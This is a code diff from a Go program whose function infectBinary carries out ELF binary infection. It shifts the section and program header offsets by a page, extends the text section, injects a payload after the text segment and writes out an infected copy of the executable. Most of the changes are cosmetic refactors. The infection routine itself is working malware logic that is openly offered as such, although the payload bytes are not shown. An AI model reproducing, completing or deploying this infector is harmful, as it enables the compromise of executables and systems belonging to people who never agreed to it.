@@ -121,7 +121,7 @@ func infectBinary(origFileHandle *os.File, pEnv *string, debug bool) {
 
 	var elfHeader elf.Header64
 	origFileReader := bytes.NewReader(origFileBuf)
-	if err :=binary.Read(origFileReader, binary.LittleEndian, &elfHeader); err != nil {
+	if err := binary.Read(origFileReader, binary.LittleEndian, &elfHeader); err != nil {
 		fmt.Println(err)
 		return
 	}
@@ -133,7 +133,7 @@ func infectBinary(origFileHandle *os.File, pEnv *string, debug bool) {
 	oShoff = elfHeader.Shoff
 
 	//[1] increase the e_shoff by PAGESIZE
-	elfHeader.Shoff += x64_PAGE_SIZE
+	elfHeader.Shoff += uint64(PAGE_SIZE)
 
 	//[3]locate program header table
 	pHeaders := make([]elf.Prog64, elfHeader.Phnum)
@@ -192,15 +192,15 @@ func infectBinary(origFileHandle *os.File, pEnv *string, debug bool) {
 
 	//Adjust the file offsets of each segment program header after the text segment program header
 	if debug {
-		fmt.Println("[+] Adjusting segments after text segment file offsets by 0x2000")
+		fmt.Println("[+] Adjusting segments after text segment file offsets by ", PAGE_SIZE)
 	}
 	// [7] && [8]
 	for j := textNdx; j < int(elfHeader.Phnum); j++ {
 		if pHeaders[textNdx].Off < pHeaders[j].Off {
 			if debug {
-				fmt.Println("Inceasing pHeader @ index ", j, "by 0x1000")
+				fmt.Println("Inceasing pHeader @ index ", j, PAGE_SIZE)
 			}
-			pHeaders[j].Off += x64_PAGE_SIZE
+			pHeaders[j].Off += uint64(PAGE_SIZE)
 		}
 	}
 
@@ -209,12 +209,12 @@ func infectBinary(origFileHandle *os.File, pEnv *string, debug bool) {
 	binary.Write(infectedBuf, binary.LittleEndian, &elfHeader)
 	binary.Write(infectedBuf, binary.LittleEndian, pHeaders)
 
-	ephdrsz := int(elfHeader.Ehsize) + int(elfHeader.Phentsize*elfHeader.Phnum)
+	ephdrsz := int(elfHeader.Ehsize) + int(elfHeader.Phentsize * elfHeader.Phnum)
 	binary.Write(infectedBuf, binary.LittleEndian, origFileBuf[ephdrsz:])
 
 	//section header table comes after the data segment, we'll need a section reader
 	infectedReader := bytes.NewReader(infectedBuf.Bytes())
-	sectionTableReader := io.NewSectionReader(infectedReader, int64(oShoff), int64(elfHeader.Shentsize*elfHeader.Shnum))
+	sectionTableReader := io.NewSectionReader(infectedReader, int64(oShoff), int64(elfHeader.Shentsize * elfHeader.Shnum))
 
 	sectionHdrTable := make([]elf.Section64, elfHeader.Shnum)
 	binary.Read(sectionTableReader, binary.LittleEndian, sectionHdrTable)
@@ -228,11 +228,11 @@ func infectBinary(origFileHandle *os.File, pEnv *string, debug bool) {
 			if debug {
 				fmt.Printf("[+] (%d) Updating sections past text segment @ addr 0x%x\n", k, sectionHdrTable[k].Addr)
 			}
-			sectionHdrTable[k].Off += x64_PAGE_SIZE
+			sectionHdrTable[k].Off += uint64(PAGE_SIZE)
 			//elfHeader.Entry here was previously adjust to be start of parasite
 		} else if (sectionHdrTable[k].Size + sectionHdrTable[k].Addr) == elfHeader.Entry {
 			if debug {
-				fmt.Println("[+] Extending section size of sectionhdr associated with text segment")
+				fmt.Println("[+] Extending section header entry for text section by payload len.")
 			}
 			sectionHdrTable[k].Size += uint64(len(payload64))
 		}
@@ -241,31 +241,23 @@ func infectBinary(origFileHandle *os.File, pEnv *string, debug bool) {
 	infectedShdrTable := new(bytes.Buffer)
 	binary.Write(infectedShdrTable, binary.LittleEndian, sectionHdrTable)
 
-	finalInfectionTwo := make([]byte, infectedBuf.Len()+int(PAGE_SIZE))
-	if debug {
-		fmt.Println("Infected buf len  => ", infectedBuf.Len())
-	}
+	finalInfectionTwo := make([]byte, infectedBuf.Len() + int(PAGE_SIZE))
 	finalInfection := infectedBuf.Bytes()
 
 	copy(finalInfection[int(oShoff):], infectedShdrTable.Bytes())
 
 	end_of_infection := int(textSegEnd)
-	if debug {
-		fmt.Printf("end_of_infection @ 0x%x\n", end_of_infection)
-	}
-	
+
 	copy(finalInfectionTwo, finalInfection[:end_of_infection])
 	if debug {
 		fmt.Println("[+] writing payload into the binary")
 	}
 	copy(finalInfectionTwo[end_of_infection:], payload64)
-	copy(finalInfectionTwo[end_of_infection+PAGE_SIZE:], finalInfection[end_of_infection:])
+	copy(finalInfectionTwo[end_of_infection + PAGE_SIZE:], finalInfection[end_of_infection:])
 	infectedFileName := fmt.Sprintf("%s-copy", origFileHandle.Name())
 
-	err = ioutil.WriteFile(infectedFileName, finalInfectionTwo, 0751)
-	checkError(err)
-	if debug {
-		fmt.Println("finalInfectionTwo cap => ", cap(finalInfectionTwo), "finalInfectionTwo len => ", len(finalInfectionTwo))
+	if err := ioutil.WriteFile(infectedFileName, finalInfectionTwo, 0751); err !=nil {
+		fmt.Println(err)
 	}
 }
 
